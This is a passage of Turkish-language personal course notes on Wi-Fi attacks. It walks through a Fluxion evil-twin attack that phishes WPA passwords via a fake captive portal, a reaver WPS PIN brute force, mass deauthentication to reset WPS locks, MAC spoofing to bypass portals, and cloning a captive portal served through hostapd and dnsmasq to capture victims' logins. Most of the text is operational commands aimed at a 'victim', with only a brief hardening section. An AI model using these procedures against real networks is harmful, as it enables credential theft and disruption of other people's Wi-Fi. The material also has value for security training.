+ardından zaten beyaz ekranda getirdiği çıktıları terminale yansıtacak bu ağlardan saldıracağımız ağın ID sütunundaki değerini örneğin 62 yazıp 
+enterlıyoruz ardından 1 çalıştırıyoruz (FakeAP Hostapd) bundan sonra bize ilgili modemin hadshake dosyasının location nını soracak 
+
+/root/handshake-test-01.cap çalıştırıyoruz (bizim handshake dosyamız hangi konumdaysa o konumu ve o isimi gireceğiz)
+fluxiom a handshake dosyasının konumunu vermemizin sebbei kurban orijinal modemin şifresini inputa girdiğinde bunu handshake ile karşılaştırıp 
+eğer eşleşirse doğru olarak kabul edecektir 
+
+şimdi bize bir SSL sertifikası oluşturmak ister misin diyor 1 yazıp enterlıyoruz bu özellik örneğin ağa bağlanıp tarayıcıdan internete erişmek
+istediği zaman karşısına modeminin şifresini girmesini istediği sayfanın HTTPS olmasını ve daha güvenilir olduğu düşünmesini sağlamak için 
+önemlidir 
+
+ardından 1 yazıp çalıştırıyoruz burada kurbanın şifresini gireceği web interface inin hangi dilde veya formatta olduğunu seçtiğimiz kısım 
+biz Turkish olan 9 u sçeip enterlıyoruz ama diğer seçeneklerde Telekom TP-Link gibi seçenek ler de mevcut 
+
+bu saldırıda aldırdığımız modeme bağlı olan bütün cihazlar ağdan düşecektir 
+
+bu dersimizde WPA2 Şifresini bulma konusunu öğrenelim 
+
+telefonumuzdan wifi den orijinal modemimizin ismine sahip olan ancak siyah bir asma kilit simgesine sahip olmayan yani şifresiz kablosuz ağa 
+bağlanıyoruz bağlantı gerçekleştikten sonra otomatik olarak telefonumuzda bir sayfa açılacak ve "internete erişmek içinwpa kablosuz ağ şifrenizi 
+giriniz" diye bir yazı çıkacak orijinal şifremizi buraya giriyoruz ardından kalimize geldiğimizde fluxion işlemini başlattığımızda açılan pencere 
+lerden Wifi Information penceresinde kırmızı renkli KEY FOUND! [ORJ-WİFİ-ŞİFRESİ] olan satırda köşeli parantez içerisindeki metin bizim 
+şifremizdir ve bu saldırının güzel yanı da şu saldırı yapılıp kurban orj ağdan yetkisizlendirildiğinde tekrar wifi listesinden orj modeme bağlanmak 
+istediğinde orj modemi listede göremiyor aynı isime sahip olan sadece bir modem ismi gözüktüğü için şüphelenmeden sahte modeme bağlanacaktır 
+ve şifresini girdikten sonra wifi listesinde bizim oluşturduğumuz sahte modem yok olup yerine orijinal modem gelecektir bu da bir diğer 
+güzel özelliği fluxion un  bu şekilde evil twin saldırısı yapmak wpa i kırmak için en etkili yöntemlerden biridir 
+
+ilgili modeme özel bir wordlist oluşturup günlerce bunu denemekten daha hızlı sonuç verebilir 
+
+bu dersimizde fluxion u editlemeyi / düzenlemeyi öğrenelim fluxion un olduğu dizine gidip terminalde bash fluxion.sh çalıştırıyoruz 
+
+4 yazıp enterlıyoruz (turkish i seçiyoruz) ardından 1 çalıştırıyoruz kendi modemimizi gördükten sonra ctrl+c yaparak bu beyaz ekranı kapatıyoruz 
+daha sonra saldıracağımız modemin id sini örneğin 42 yazıp enterlıyoruz daha sonra handshake dosyamızın location unu giriyoruz 
+/root/handshake-test-01.cap > YES çalıştırıyoruz daha sonra 1 çalıştırıyoruz tekrar 1 çalıştırıyoruz daha sonra gelen seçeneklerden 
+Turkish [TR] (neutra) olan satırın id sini yazıyoruz 9 yazıp çalıştırıyoruz daha sonra arayüzden Files a tıklıyoruz (mavi renkteki bir klasör 
+ikonuna sahip dosya genelde solda masaüstünde veya aşağıdaki application bar kısmında yer alır) daha sonra açılan pencerede sol tarafta başında 
++ Other Locations kısmına tıklıyoruz daha sonra açılan kısımdan Computer ı seçiyoruz daha sonra tmp klasörüne tıklıyoruz ve bu klasörün de 
+içinde TMPflux isimli klasöre giriyoruz /tmp dizini sistemimide geçici dosyaların tutulduğu bir dizindir biz sadece sistemde bir tool u veya 
+programı kullandığımızda o oturuma özel olarak oluşturulmuş geçici dosyaların tutulduğu bilgisayarı yeniden başlattığımız zaman buradaki 
+dosyaların silindiği biz dizindir  fluxion apache2 server kullanmıyor captive portal oluşturmak için lighttpd isimli kendisinin bir sunucu 
+sunu kullanıyor (lighthttp kullanıyor) daha sonra bu klasördeki data klasörüne giriyoruz daha sonra buradaki index.html dosyasına sağ tık yapıyoruz 
+Open With Other Application ı seçiyoruz ve gelen seçeneklerden bu dosyayı Geany editörü ile açıyoruz burada captive portal da görünen web 
+sayfasının tasarım kodları yer alıyor bunları dilediğimiz gibi değiştirebiliriz ancak biz burada 29. satırdaki internete erişmek için kablosuz ağ
+şifrenizi giriniz stringini değiştirelim buraya Modem güncellemenizin yapılabilmesi için şifrenizi giriniz ardından bu dökumanı kaydedip kapatıyoruz 
+ardından tekrar telefonumuzdan wifi dan fake modemimize bağlanıyoruz ve ana ekrana gelen sayfadaki metnin değişitğini görebiliyoruz 
+
+şimdi wpa şifresini kırmanın bir başka yolu olan WPS i öğrenelim ancak wps saldırıları güncelliğini yitirmiş güncel modemlerde çok fazla işe 
+yarayan bir saldırı türü değildir daha sonra browserımızdan 192.168.1.1 adresine giderek modemimizin arayüzüne essid ve şifremizi girerek giriş yapıyoruz 
+huawei cihazlarda açılan sayfada yukarıda home network tabına tıklıyoruz daha sonra sol tarafta gelen seçeneklerden WLAN Access e tıklıyoruz 
+daha sonra açılan kısımda sağda Enable WPS kutucuğunu işaretleyerek WPS i etkinleştiriyoruz daha sonra WPS Configration başlığının altında 
+WPS by client PIN i seçerek 12345670 şeklinde 8 haneli bir PIN numarası veriyoruz bu pin numarası ile modemimize uzun uzun şifre girmeden bağlana 
+biliriz peki uuzn uzun şifre girmek daha güvenliyken neden böyle bir seçenek var aslında bu teknolojinin geliştirilme amacı ağa bir printer 
+veya scanner gibi ofis cihazları bağlanmak istediği zaman bu cihazlarda bir klavye olmadığı veya uzun şifre olması durumunda girmesi çok güç ola 
+cağından dolayı 8 haneli bir pin ile hızlıca ağa bağlanmaları amaçlanmıştır ve böyle bir ihtiyacımız yok ie bunu etkin yapmamız bizim için riskli bir 
+durumdur o yüzde kapatmalıyız daha sonra pin i girdiğimiz inputun hemen sağ altındaki Connect butonuna basıyoruz daha sonra kalimizi açıyoruz 
+
+daha sonra kali terminalimizi açıp airmon-ng start wlan0 ağ kartımızı monitör moda alıyoruz daha sonra wash -i wlan0 çalıştırıyoruz 
+ve bu tool ile etrafımızda WPS özelliğinin etkin olduğu bütün ağları terminalimize çıktı olarak vermemizi sağlar bu çıktıda Lck.(Lock)
+sütununda No değerine sahip olan cihazlar WPS i etkin olan cihazlardır Yes olanlar ise wps özelliği kilitlenmiş cihazlardır 
+
+ardından ctrl c yaparak izleme işlemini durduruyoruz 
+
+bu dersimizde wps ı kırmak için reaver isimli bir toolu kullanacağız 
+
+wash -i wlan0mon çalıştırıyoruz (monitör moda geçtikten sonra !!!) terminalde kendi bssid mizi gördükten sonra ctrl+c ile işlemi durduruyoruz 
+
+reaver --bssid kurban-modemin-maci --channel 5 -i wlan0mon çalıştırıyoruz 
+(gelen çıktıda modemimizin bulunduğu satırda Ch sütunundaki değeri yazacağız)
+
+burada karşımıza bir soru çıkıyor daha önce bu saldırıyı başlattıysanız kaldınığınız yerden devam etmek ister misiniz diye bu reaver ın kendi 
+içerisindeki pause / resume özelliğidir biz bu soruya n yazıp enterlıyoruz ve işlemi başlattıktan sonra failed to associate hatası aldık 
+(bu hata ne anlama geliyor öğren buraya yaz tam anlamadım)  bu işlemi burda ctrl+c ile durduruyoruz new tab diyerek yeni bir terminal tabı açıy 
+oruz modem ile associate olmak için fake authentication -sahte yetkilendirme- kullanacağız aireplay-ng --fakeauth 60 -a modemin-mac -h wlan0mon-mac wlan0mon çalıştırıyoruz
+wlan0mon un mac adresini ifconfig çalıştırarak wlan0mon yazan kısımdaki unspec kelimesinden sonra gelen ilk 2 li 6 çift i kopyalamamız lazım 
+
+bu şekilde kopyaladığımız zaman her ikilinin arasında bir - (dash/kısa çizgi) kullanılıyor bunu : (iki nokta üst üste karakteriyle değiştirmemiz gerekiyor
+koddaki -h (hardware / donanım kelimesinin ilk harfidir) yukarıdaki kodu çalıştırdığımızda association successful çıktısını alacağız 
+şimdi bir önceki reaver ı çalıştırdığımız terminale dönüyoruz reaver --bssid kurban-modemin-maci --channel 5 -i wlan0mon -A çalıştırıyoruz 
+buradaki -A ifadesi association u manuel olarak bizim yapacağımızı söylediğimiz bir parametre ardından yine n yazıp enterlıyoruz 
+
+işlem başlatıldıktan sonra associate hatası almadık ancak süreç bir türlü ilerlemedi 
+bu işlemimizi ctrl+c ile durduruyoruz ve reaver --bssid kurban-modemin-maci --channel 5 -i wlan0mon -A -vvv 
+-vvv (verbose parametresi yani yapılan bütün işlemleri/hata mesajlarını/süreçleri vs terminale yazdır demek)
+
+daha sonra n yazıp enterlıyoruz daha sonra bu çıktıları okumak için ctrl+c yapıyoruz ve wps transaction failed (code :0x03) isimli bir hata 
+aldığımızı görüyoruz ve bu hata kodunu google da aratıyoruz 
+
+https://github.com/shift/reaver-wps/issues/183 bağlantısından ilgili sorunun çözümünü bulabiliriz 
+
+-vvv ile çalıştırdığımızda çıktılar arasında Sending WSC NACK şeklinde bir mesaj gördük bu NACK isimli bir paket yollanıldığı anlamına geliyor saldırı 
+yapılırken biz bu NACK paketlerini yollamadan saldırımızı gerçekleştirmeye çalışalım reaver --help çalıştırarak reaver ile ilgili yardım sayfasına 
+ulaşabiliriz 
+
+ reaver --bssid kurban-modemin-maci --channel 5 -i wlan0mon -A -N çalıştırıyoruz daha sonra n yazıp enterlıyoruz 
+ (-N = --no-nacks parametresi demektir yani nacks paketlerini gönderme)
+
+ bu sefer bir hata almadım ancak yine işlemimiz devam etmiyor new tab de wash -i wlan0mon çalıştırdığımızda modemimizin olduğu satırda Lck 
+ yani kilit sütununun No dan > Yes olarak değişitğini görüyoruz bu şu anlama gelir modemimiz wps hizmetine / servisine bir brute-force saldırısı 
+ olduğunu anlayıp WPS hizmetini kilitledi demektir 
+
+ bu dersimizde brute force saldırımızdan sonra kendini Locked yapan modemin kilitini kaldırmayı / aşmayı öğrenelim 
+
+ WPS kilitlerini açmanın en iyi yöntemi modeme deauthentication saldırısı yapmaktır bunu yapmak için new tab de monitör modda iken 
+ aireplay-ng --deauth 1000000000 -a modem-bssid wlan0mon çalıştırarak modemin kendisine reset atmasını sağlayabiliriz (lock konusunda yani o lock 
+ u kendisinin kaldırmasını sağlayabiliriz ) bu durumu küçük paket sayıları ile kodumuzu çalıştırdığımızda ağdaki kullanıcıyı modeme reset atmasını 
+ sağlayamadığımız durumlarda kullanabiliriz eğer bu işlemi başlattığımızda no such bssid available hatası alırsak new tab de (mevcut terminalde işlem
+ imiz çalışmaya devam ederken) airodump-ng --bssid modem-mac --channel 5 wlan0mon çalıştırdıktan hemen sonra (channel ı doğru girmemiz çok önemli)
+aireplay-ng --deauth 1000000000 -a modem-bssid wlan0mon de çalıştırıyoruz daha sonra modemimiz kendini resetlediği için tekrardan browserımızın 
+adres çubuğuna 192.168.1.1 i giriyoruz home network > Wlan Access > Connect butonuna basarak wps i etkinleştiriyoruz (bu şekilde wps lock unu 
+açıyoruz modemin) 
+
+daha sonra bir tabda aireplay-ng --fakeauth 60 -a modemin-mac -h wlan0mon-mac wlan0mon çalıştırdıktan hemen sonra diğer tabda 
+
+airodump-ng --bssid modem-mac --channel 5 wlan0mon çalıştırıyoruz (sırayla çalıştırılması çok önemli) ardından brute-force umuza kaldığımız yerden 
+devam etmek için Y yazıp enterlıyoruz 
+
+eğer şifreyi kırabilseydi direkt olarak clear PIN i terminalimize yazdıracaktı 
+
+bu dersimizde güvenli bir modeme sahip olmak için neler yapmamız gerekiyor bunları öğrenelim 
+
+yetkisizlendirme saldırılarına karşı bazı frameworkler kullanabiliriz her zaman işe yaramıyor ancak en çok işe yarayanı bulup kullanabiliriz 
+
+802.11n: Next-Generation Wireless LAN Technology frameworkünü / protokolünü kullanmalıyız 
+
+ya da mac filtrelemesi ile sadece xxx yyy mac adresi / adreslerine sahip cihazların modeme bağlanmasına izin verebiliriz bu şekilde bir önlem 
+alabiliriz. 
+
+bunu browserdan 192.168.1.1 adresine girip yapılandırabiliriz (admin dashboardından) peki bu önlem de tam bir güvenlik sağlar mı 
+cevp hayır ancak hacker airodump ile ağa bağlı olan mac adreslerini gördükten sonra kendi mac adresini bu mac adresiyle değiştirip 
+modeme kolayca bağlanabilir 
+
+Captive portal : Kısıtlama portalı, bir Wi-Fi veya kablolu ağın yeni bağlanan kullanıcılarına 
+ağ kaynaklarına daha geniş erişim hakkı verilmeden önce görüntülenen bir web tarayıcısı ile erişilen bir web sayfasıdır.
+
+herhangi public olarak wi-fi da listelenen bir ağa bağlandığımızda orada kimlik bilgilerimizi alan ve sonra bağlandığımız ağa internet erişimi veren 
+arayüzler, araçlardır 
+
+captive portal kullanan ağlar genellikle şifresiz ağlardır ancak bu ağlara güvenlik sebebiyle veya kişisel verilerimizi toplamak için 
+GSM numarası TC kimlik numarası gibi bilgilerimizi vererek giriş sağlarız bu eğer bu ağa yönelik bir saldırıda bulunursak saldırı yapan kişinin
+hangi kimlik bilgisi veya cep telefonu ile girdiğini bulmak için konulmuş olabilir 
+
+peki biz bu captive portallarda sorulan şifre gsm numarası veya tc kimlik numarası gibi bilgileri hiç vermeden veya başkasının bilgilerini vererek 
+bu login ekranlarını nasıl manipüle ederiz 
+
+bu login ekranını bypass etmek için şifresiz bir ağa bağlandıktan sonra airodump çalıştırarak o ağa halihazırda authenticate edilerek bağlanmış 
+olan bir kullacının mac adresini kendi mac adresimiz olarak değiştirerek ağa bağlanabiliriz 
+
+ağa bağlandıktan sonra arp spoofing yapabiliriz 
+
+diğer bir yöntem de biz kendimiz sahte bir portal oluşturup bir kullanıcıyı  orijinal ağdan yetkisizlendirme saldırısı ile düşürüp 
+fake portalımıza girmesini sağlayıp kullanıcı adı ve şifresini fake captive portalımıza girmesini sağlayabilirz 
+
+hostapd ve dns mask sahte modem oluşturup ve bu yaptığımız modemin içine klonladığımız (fake captive portalımızı) kullanıcıya görünteyelim 
+
+bu bölümde amacımız sadece bir captive portalı hacklemek değil serverlarla çalışmayı öğrenmek, site klonlamayı öğrenmek, apache server a bu sitemizi 
+entegre etmeyi öğrenmek, dns mask i öğrenmek 
+
+bu dersimizde captive portal klonlamayı öğrenelim 
+
+öncelikle kalide sağ üstten kablolı baülantıyı devre-dışı bıraktık ve public ağımıza bağlanıp browserdan captive portalın olduğu sayfaya geldik 
+
+alt tuşuna basıyoruz ekranın en üstünde çıkan file > save page as / dosya > sayfayı farklı kaydet diyoruz 
+ardından açılan pencerenin sağ altında Web Page, complete seçeneğini seçiyoruz (bütün web sayfasını kaydet)
+
+ardından kali lokalimizde Files > Downloads Wifi login.html gibi isimle bir dosyamızın kaydedildiğini görüyoruz ardından bu .html dosyamızı 
+açıyoruz açtığımızda kaydettiğimiz web sayfasının -görsel öğeleri,metinsel ksımları vs.- eksiksiz bir şekilde indirilmiş olabilir ancak 
+resimler eksik de olabilir resimlerin eksik olduğu durumlarda captive portal sayfamıza gelip (kendi browserımızdan) sağ tık > view page source 
+u seçiyoruz <div class='logo'></div> etiketine tıklıyoruz sağ tarafta rules tabında background: url(logo.jpg) [veya ne yazıyorsa] bu bir bağlantı 
+olduğu için bu yazıya sağ tık > copy image data-url diyoruz ve bu url i browser a yapıştırıyoruz daha sonra açılan logo image ını 
+save image as diyerek lokalimizde az önce save page as diyerek indirdiğimiz dosyanın / klasörün içerisine kaydediyoruz 
+
+ardından etiketlerde div id=background etiktine tıklıyoruz soldan daha sonra sağdan rules > background.jpg linkinin url sini kopyalıyoruz 
+browsera yapıştırıp bunu da aynı klasörün içine kaydediyoruz 
+
+her resmi sayfadaki görevine göre background.jpg logo.jpg gibi kaydetmemiz gerekiyor sayfa kodlarında nasıl kaydedilmişse o uzantıda göre indirmek 
+fake captive portalımızı oluştururken daha sağlıklı bir sonuç doğuracaktır 
+
+kalimizde dosya gezgininden other locations > computer > var > www > html dizinine gidiyoruz bir önceki derste edit yaptığımız .html uzantılı 
+dosyamızı ve klonlamak istediğmiz sayfamızı indirdikten sonra inen klasörü bu dizine kopyalıyoruz ardından /var/www/html dizinindeki 
+index.html dosyasısa sağ tık move to trash diyerek siliyoruz ve bu dizine yapıştırdığımız .html uzantılı dosyanın ismni index.html olaeak 
+değiştiriyoruz ardından terminalimize gelip servie apache2 start çalıştırıyoruz ardından ifconfig çalıştırdığımızda 
+(hangi ağ kartını kullanıyorsak eth0 veya wlan0) gelen çıktının inet satırında (örn. inet 192.168.1.25) şeklinde olan değer bizim lokalip adresi
+mizdir ardından nat network ile aynı ağda olan windows sanal mikinemize geliyoeruz ve browserımızın adres çubuğuna bu inet adresini yazıyoruz 
+ve enterlıyoruz (her bilgisayarda bu ip adresi farklı olaiblir; ifconfig çalıştırarak bu ip adresini görebiliriz)
+
+ve gördüğümüz gibi sitemiz açıldı herhangi bir sorun gözükmüyor şuanlık görsel olarak klonladığımız sitenin tam olarak aynısını oluşturup yayına 
+almayı başardık ardından kali terminalimizde apt-get install geany  çalıştırıyoruz gelen soruya Y yazıp enterlıyoruz. geany aslında bir editördür 
+içinde herhangi bir programlama dilini veya html css gibi işaretleme dillerini de yazabileceğimiz bir editördür 
+ardından muhtemelen bizde böyle bir hata çıkmaz ama yüklememiz gereken bazı güncellemelerimizin olduğunu söylüyor bunları yüklemek için 
+terminalde apt-get update --fix-missing çalıştırıyoruz ardından Y yazıp enterlıyoruz güncellemelerimiz yüklendikten sonra tekrar 
+apt-get install geany çalıştırıyoruz ve geany nin kurulumunu tammalıyoruz geany ile bo bir dökuman açmak için terminale geany çalıştırabiliriz 
+
+bu dersimizde clonumuz yani index.html imiz içerisinde captive portalımızın düzgün çalışması için bazı linkleri değiştirmemiz gerekiyor 
+
+/var/www/html/index.html e sağ tık yapıp open with other application > geany i seçiyoruz 
+
+ardından geany nin search isimli tabından find kısmına tıklıyoruz search for: kısmına href yazıoruz ve hemen sağ altındaki next butonuna basıyoruz 
+24. satırda <link rel=*stylesheet* bizimstilimizin tutulduğu dosyanın ismidir stil = web sayfasında görünen fontlar,yazılar,karakter stili,
+karakter büyüklükleri, karakter renkleri vs (bu özellikleri ayarlayan html ve css kodlaırnın bulunduğu dosyanın ismidir) 
+ardından yine aynı satırda href=wifi%20login_files/style.css den yani stilimizin bulunduğu bu dosya ismindkeki dosyadan html ve css kodlarını al 
+diyor (bu dosya ismi bizim klonunu yapmak istediğimiz captive portala göre değişiklik gösterebilir!!!)
+
+html de bir web sayfasındaki href etiketinin içerisindeki linkleri relative path (göreli yol ) olarak değil de absolute path olarak 
+vermemiz gerekir bunun içinde geany den replace özelliğini kullanarak bütün href etiketlerinde değişiklik yapmamız gerekiyor 
+geany nin search > replace kısmına tıklıyoruz search for: kısmına href=* yazıyoruz ardından bu pencrenin sol altında Replace All yazan yere tıklıyoruz 
+(tıklayınca Close dialog işaretli olması gerekiyor) replace with: kısmına da href=*/ ve aşağıdaki In Document butonuna basıyoruz 
+(yani dökuöanın içeriisndeki bütün href=* olan ifadelerri href=*/ olarak değiştirdik)   ardından en üstteki File tabından Save e tıklıyoruz 
+
+ardından kali browserımızı açıyoruz localhost yazıyoruz ve enterlıyoruz klonumuz düzgün bir şekilde görüntülendi herhangi bir problem yok 
+ancak bazen browserda daha önce açtığımız bir web sayfasını açmak istediğimizde eğer o web sayfası güncel olarak bozuk bir görüntüy sahipse cache 
+yani browserın önbelleğinden o sayfanın düzgün görüntülenmiş versiyonunu bize gösterebileceğinden (browser) mozilla sağ üstteki üst üste 3 yatay 
+olduğu kısımdan seçenekleri açıyoruz History > Clear Recent History > Today > Clear Now diyoruz ve sayfamızı yeniliyoruz yine düzgün görüntüleniyor 
+herhangi bir problem yok 
+
+ancak düzgün çalışıp çalışmadığını test etmenin en sağlıklı yolu kurban bilgisayrdan yani diğer sanal windows makinemizin browserından 
+kalimizin local ip sini yazarak o sayfayı açmak windows dan açağımız tarayıcının history sini de aynı şekilde siliyoruz 
+ve arama kısmına kali local ip mizi yazıyoruz ve burada da sayfamız düzgün bir şekilde açıldı / görüntülendi 
+
+bu dersimizde formları değiştirmek konusunu öğrenelim:
+
+klon olan index.html imizi geany ile açıyoruz search > find kısmını açıyoruz 
+
+<p>please fill in the form and press the submit button </p> 
+<form action="/goform/htmlloginrequest" method="post" id="loginform"> eklinde bir satır arıyoruz bu satırı sayfada kullanıcı adı ve şifrenin 
+girildiği submit / form etiketinin içerisinde aramamız önemli çünkü kullanıcı adı ve şifre girilen kısım bizim ilgilendiğğimiz nokta burada 
+
+<form action="/goform/htmlloginrequest" ifadesini <form action="/index.html" olarak değiştiriyoruz bu işlemimiz kurban kullanıcı adı ve şifresini submit 
+ettiğinde kurbanı hangi sayfaya yönlendireceğimiz şifreyi girdikten sonra tekrar captive portal ana sayfasına yönlendirilecek yani 
+
+eğer kullanıcı adı ve password un submit edileceği etikwti bulmakta zorlanırsak bunu cptive portal ı açtıktan sonra inspect element diyerek 
+web devoloper toolunu açıp tek tek etiketlerin üzerine gelerek o kısmı içeren element i bulabiliriz (üzerine gelinen her satır sayfada 
+hangi bölümü etkiliyor / ifade ediyor / görüntülüyor) bunu açık mavi bir renk ile taralı şekilde gösteriliyor 
+
+bu dersimizde klonladığımız sayfayı wireless bir ağ üzerinden yayına almayı öğrenelim 
+bu bölümde hostapd ve dnsmask yöntemlerini kullanacağız 
+
+wireless üzerinden yayın yapabilen bir modem oluşturmak için şu 3 maddeyi gerçekleştirmemiz lazım 
+
+*yayın yapan bir modem 
+*bağlanan cihazlara ip dağıtan bir mekanizma = DHCP sunucusu 
+*dns leri çözümleyecek bir dns sunucusu 
+
+bu üç gereksinimi de : hostapd + dnsmasq ile çözelim 
+
+hostapd yayın yapma problemini / gereksinimini çözerken / karşılarken dnsmasq de oluşturduğumuz bu ağa bağlanan cihazlara ip dağıtma ve 
+dns leri çözümleme problemini çözecektir 
+
+muhtemelen kali linux da hostapd ve dnsmasq yüklü geliyordur ancak her ihtimale karşı yüklememizde fayda vardır 
+
+kali terminalimizi açıp apt-get install hostapd dnsmasq çalıştırıyoruz ardından Y ye basıp enterlıyoruz  
+
+ehok kursunda bir çok routing kuralı oluşturmuştuk / koymuştuk örneğin iptable ı kullandık xxx portundan gelen bilgiyi / veriyi yyy portuna ilet 
+kuralını kullandık bu kuralları kaldırmamız gerekiyor 
+
+service network-manager stop çalıştırıyoruz ardından echo 1 > /proc/sys/net/ipv4/ip_forward çalıştırarak iip forwarding i etkin hale getiriyoruz 
+(yoksa devre-dışı mı bırakıyoruz tam bilmiyorum araştır buraya yaz) 
+ardından iptables --flush (bu komut iptables ile ilgili yaptığımız bütün konfigrasyonları / değişiklikleri resetliyor default ayarlarına getiriyor)
+iptables --table nat --flush (burada da nat table içerisindeki ayarları resetledik)
+iptables --delete-chain çalıştırıyoruz ardından iptables --table nat --delete-chain çalıştırıyoruz ardından 
+iptables -P FORWARD ACCEPT çalıştırıyoruz 
+
+bu dersimizde DNS ayarlarını yapalım 
+
+hostapd ve dnsmasq in kendileriyle yüklü olarak gelen bazı Configration dosyaları var bunları file explorer > other locations > computer 
+kısmına gelip sağ üstten büyüteç simgesine tıklayarak dnsmasq.conf diye aratıyoruz gelen çıktılardan ilk yani en soldaki dosya
+dnsmasq deki bütün opsiyonların ve konfigrayon ayarlarını içeren bir doyadır bu ancak biz bu dosyayı kullanmayacağız kendi konfigrasyon 
+dosyamızı oluşturacağız arayüzden Document a gelip sağ tık new folder > hotspot isimli bir klasör açıyoruz ardından oluşturduğumuz 
+bu klasörün içerisine giriyoruz ve dnsmasq.conf isimli bir dosya oluşturuyoruz bunu leafpad ile çıp içerisine sadece dns yazıyoruz ve dosyamızı 
+kaydediyoruz eğer boş .conf uzantılı bir dosya oluşturmamıza izin verilmez ise biz de leafpad ile boş bir belge açıp içerisine dns yazıp 
+/Documents/hotspot/dnsmasq.conf olarak kaydedelim ardından dnsmasq.conf umuzu normal bir text editör ile açıyoruz bu dökumanımızda 
+kesinlikle belirtmemiz gereken bazı işlemler / bazı komutlar var öncelikle bu belirtmemiz gereken şeyler nelerdir ve bunları nasıl yazarız bun 
+ları öğrenelim ilk olarak hangi ağ adaptörünü (wlan0 mu eth0 mı) kullanacağımızı belirtmemiz gerekiyor 
+dökumanımıza şunları yazıyoruz 
+<-------------------------------------------------------------------->
+#wi-fi interface i belirt 
+interface = wlan0
+
+#DHCP sunucununun dağıtacagı ip adreslerini yaz
+dhcp-range = 10.0.0.12, 10.0.0.90, 8h 
+
+#modem ip nin ne olacağını yaz 
+dhcp-option = 3, 10.0.0.1 
+
+#dns sunucusunu yaz 
+dhcp-option = 6,
+
+#gelen tüm request (istekleri) 10.0.0.1 e yönlendir 
+address = /#/10.0.0.1 
+
+<-------------------------------------------------------------------->
+
+bu koddaki # ifadesi çalıştırılmayacak stringleri içeren komut satırı anlamına geliyor 
+dhcp_range kısmında oluşturduğumuz modeme bağlanan cihazların hangi ip aralıkları arasındaki ip leri alabileceklerini belirlediğimiz koddur 
+8h yazan kısım bu ip lerin ne kadar süre (8saat=8hours=8h) geçerli kalacağını (8 saat sonra modem tamamen kapanıyor mu yoksa bağlı olan cihazların 
+lokal ipleri mi değişiyor eğer değişiyorsa modemin ip si de değişiyor mu onu yaz)
+ip lerin 10.0.0.x şeklinde gitmesinin(192.168.1.x şeklinde gitmemesinin sebebi de) virtual box da ip atamalrı genellikle 10.x.x.x şeklinde atandığı 
+içindir modeme 10.0.0.1 ipsinin verilmesinin sebebi modemin ip si genelde (fiziksel ev ağlarında 192.168.1.1 şeklinde olduğundan sondaki bir 
+i ifade eder yani o subnetteki ilk ip ye sahip olan cihaz olsun diye)
+3 ve 4. komutlarımızda dhcp_option = 3, / 6, şeklindeki rakamlar dhcp_option yani dhcp ayarları listesinde o kodda yapmak istediğimiz ayarın 
+listedeki numeric karşılığıdır (sayısal karşılığıdır) 
+en sondaki kodda ise oluşturduğumuz ağda internete yapılan bütün istekleri 10.0.0.1 e yani modeme yönlendir böylece bizim uygulamamız captive 
+portal olacağı için kullanıcılar bir istek yaptıklarında (username - password verilerini submit etmek gibi) bu verilerin / isteklerin 
+modemimize yönlendirilmesini sağlıyoruz ardından bu dosyamızı file > save veya ctrl+s diyerek kaydediyoruz ardından kali terminalimize geliyoruz 
+
+dnsmasq --help çalıştırarak dnsmasq in yardım sayfasına gidebiliriz ardından dnsmasq -C /root/Documents/hotspot/dnsmasq.conf çalıştırıyoruz ve 
+hiç bir çıktı almadık bir hata vermediğine göre çalıştığı anlamına geliyor 
+
+bu dersimizde hostapd ayarlarını yapalım leafpad ile boş bir dökuman oluşturuyoruz içine bir şey yazmıyoruz file > save as diyoruz dosyamızı
+bir önceki dersteki hotspot isimli klasörün içerisine hostapd.conf olarak kaydediyoruz 
+
+ardından hostapd.conf u text editörü ile açıyoruz 
+
+#interface i yaz 
+interface=wlan0
+
+#yayınlayacağımız ağ ismini seç 
+ssid=hotel wifi v2 
+
+#hangi kanalda yayın yapılacak 
+channel=3 
+
+#sürücü
+driver=wifi-kartımızın-sürücü-numarası
+
+ardından ctrl+s yaparak dosyamızı kaydediyoruz dikkat edersek parametre ve değerleri girerken parametre=değer şeklinde arasında boşluk bırakmadan 
+yaptık çünkü hostapd bizden bu formatta parametre ve değer girmemizi istiyor framework den framework e göre dğeişebilir bu durum 
+driver= kısmı opsiyoneldir yazılmasa da olur ancak hostapd nin bazı özelliklerini kullanabilmemiz için bu konfigrasyonu yapmamız gerekebilir
+
+ardından kali terminalimize geliyoruz hostapd /root/Documents/hotspot/hostapd.conf -B çalıştırıyoruz burada yazdığımız -B komutu komutta çalıştıracağımız 
+işlemi arkaplan servisi olarak çalıştır ve terminale komut ile ilgili çıktı verme anlamına gelir 
+
+komutu çalıştırdığımızda hata aldık o yüzden service network-manager stop çalıştırıyoruz ardından tekrar ifconfig wlan0 up çalıştırıyoruz ve 
+
+ tekrar hostapd /root/Documents/hotspot/hostapd.conf -B komutunu çalıştırıyoruz yine aynı hatayı aldık 
+
+ bu sorunu çözmek için wifi kartımızı cihazımızın takalı olduğu usb portundan çıkartıyoruz ve tekrar takıyoruz wifi kartımızı 
+
+ ardından virtual box devices kısmını kontrol ettiğimizde wifi kartımızı gördüğünü ve wifi kartımızın isminin başında siyah bir tik ikonu olduğunu 
+ görüyoruz ardından tekrar hostapd /root/Documents/hotspot/hostapd.conf -B komutunu çalıştırıyoruz yine aynı hatayı alırsak 
+
+ service network-manager restart çalıştırıyoruz ve tekrar hostapd /root/Documents/hotspot/hostapd.conf -B çalıştırıyoruz 
+
+ yine hata alırsak service network-manager stop çalıştırıyoruz tekrar hostapd /root/Documents/hotspot/hostapd.conf -B çalıştırıyoruz 
+ yine hata aldıysak (burada service network-manager stop dedikten sonra ağa tekrar bağlanmak için servie network-manager start mı çalıştırmamız 
+ gerekiyor bunu araştır buraya yaz)
+
+ bu durumda kali sanal makinamızı kapatmamız lazım (power off yapmamız lazım) daha sonra wifi kartımızı usb den çıkartıyoruz 
+ ardından kali sanal makinemizi yeniden başlatıyoruz kali kullanıcı adı ve şifremizi girdikten sonra masaüstü ortamı tam olarak yüklendikten sonra wifi 
+ kartımızı takıyoruz devices kısmından vb ın kartımızı gördüğünü doğruluyoruz 
+
+ ardından kali terminalimize gleiyoruz hostapd /root/Documents/hotspot/hostapd.conf -B çalıştırıyoruz tekrar aynı hatayı alırsak 
+
+ service network-manager stop çalıştırıyoruz tekrar hostapd /root/Documents/hotspot/hostapd.conf -B komutunu çalıştırırız 
+ gelen çıktının en son satırında wlan0: AP-ENABLED yazısı çıkıyorsa komutumuz başarıyla çalıştırılmıştır demektir 
+
